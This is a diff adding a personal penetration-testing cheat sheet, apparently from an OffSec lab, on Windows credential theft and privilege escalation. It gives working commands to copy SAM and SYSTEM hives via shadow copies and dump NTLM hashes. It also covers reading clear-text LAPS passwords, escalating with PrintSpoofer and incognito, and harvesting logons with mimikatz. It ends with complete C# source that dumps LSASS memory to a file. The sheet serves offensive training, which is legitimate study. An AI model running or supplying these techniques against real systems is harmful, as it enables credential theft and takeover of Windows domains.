@@ -1,1 +1,144 @@
+################################ Local Admin Account HASH #############################
+
+$ Local Windows credentials are stored in SAM password hashes using the NTLM .
+$ Every Windows account has a unique Security Identifier (SID)
+
+# rdesktop -u corp1\\offsec -p lab 192.168.120.10
+
+# Try to copy SAM file usiing copy c:\Windows\System32\config\sam C:\Users\offsec.corp1\Downloads\sam
+We got no success as it is restricted already in use.
+we can try workaround 
+
+# we’ll launch wmic, create a new shadow volume and this will create a snapshot of the C drive.
+
+    wmic shadowcopy call create Volume='C:\'
+    vssadmin list shadows
+    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
+    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
+    reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
+    reg save HKLM\system C:\users\offsec.corp1\Downloads\system
+
+# In kali install
+    sudo apt install python-crypto
+
+    cd usr/share/creddump7
+    /pwdump.py /home/kali/system /home/kali/sam
+
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+
+################################ LAPS Toolkit for clear-text password #############################
+
+# Microsoft released the Local Administrator Password Solution (LAPS)  to address the issue of centrally managing passwords
+# we'll invoke the Get-LAPSComputers method from LAPSToolkit to list all computers that are set up with LAPS and display the hostname, the clear text password, and the expiration time:
+  Import-Module .\LAPSToolkit.ps1
+  Get-LAPSComputers
+  appsrv01.corp1.com  <blank pass>  (Because we dont have access to read password)
+
+# We can use the Find-LAPSDelegatedGroups method of LAPSToolkit to discover groups that can fully enumerate the LAPS data:
+  ps:> Find-LAPSDelegatedGroups
+  CORP1\LAPS Password Readers
+
+# Next, we can use PowerView to enumerate members of that group
+  PS C:\Tools> Get-NetGroupMember -GroupName "LAPS Password Readers"
+  MemberName   : jeff
+  MemberName   : admin
+
+# Finally we will login as admin user and run "Get-LAPSComputers" to get the clear-text password
+  appsrv01.corp1.com u572&ML7h3x44f 01/13/2021 00:36:02
+
+################################ Priviledge Escalation #############################
+
+# Access token is created by the kernel upon user authentication 
+
+# We can easily view the available privileges for the current user with whoami 
+
+  whoami /priv
+  psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
+
+# Use https://github.com/itm4n/PrintSpoofer to escalate priviledges from NT\Services to NT\Authority
+PrintSpoofer.exe -i -c cmd
+C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
+
+################################ Incognito #############################
+
+https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe
+  incognito.exe list_tokens -u
+  incognito.exe execute -c "corp1\admin" C:\Windows\System32\cmd.exe
+
+################################ Mimikatz ################################
+
+1. C:\Tools\Mimikatz> mimikatz.exe
+
+mimikatz # privilege::debug
+
+mimikatz # sekurlsa::logonpasswords
+
+ * Username : offsec
+         * Domain   : corp1
+         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+
+2. Task Manager -> locate the lsass.exe -> Create dump
+
+  mimikatz.exe
+  sekurlsa::minidump lsass.dmp
+  sekurlsa::logonpasswords
+
+3. C# code to execute a memory dump with mimikatz
+
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace MiniDump
+{
+    public class Program
+    {
+        static int MiniDumpWithFullMemory = 2;
+        static UInt32 PROCESS_ALL_ACCESS = 0x001F0FFF;
+
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        public static void Main(string[] args)
+        {
+            // Get the PID of lsass.exe
+            Process[] lsass = Process.GetProcessesByName("lsass");
+            int lsass_pid = lsass[0].Id;
+            Console.WriteLine($"Got lsass.exe PID: {lsass_pid}.");
+
+            // Get a handle on LSASS
+            IntPtr handle = OpenProcess(PROCESS_ALL_ACCESS, false, lsass_pid);
+            Console.WriteLine($"Got a handle on lsass.exe: {handle}.");
+
+            // Dump LSASS process to file
+            string filePath = "C:\\Windows\\tasks\\lsass.dmp";
+            FileStream dumpFile = new FileStream(filePath, FileMode.Create);
+            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            if (dumped)
+            {
+                Console.WriteLine($"Dumped LSASS memory to {filePath}.");
+            }
+            else
+            {
+                Console.WriteLine($"Error dumping LSASS memory: {Marshal.GetLastWin32Error()}");
+            }
+        }
+    }
+}
+  
+# mimikatz.exe
+# sekurlsa::minidump lsass.dmp
+# sekurlsa::logonpasswords
+
+
+
+  
+
+
+
+
 
